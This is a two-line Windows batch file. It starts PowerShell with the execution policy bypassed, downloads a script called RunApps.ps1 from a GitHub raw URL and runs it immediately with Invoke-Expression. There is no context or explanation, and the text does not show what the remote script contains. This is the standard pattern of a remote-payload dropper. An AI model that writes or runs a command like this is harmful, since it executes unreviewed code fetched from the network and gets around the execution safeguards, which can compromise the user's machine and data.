@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "$url='https://github.com/xxuavails/TestMessage/raw/main/RunApps.ps1'; Invoke-Expression (Invoke-WebRequest -Uri $url).Content"
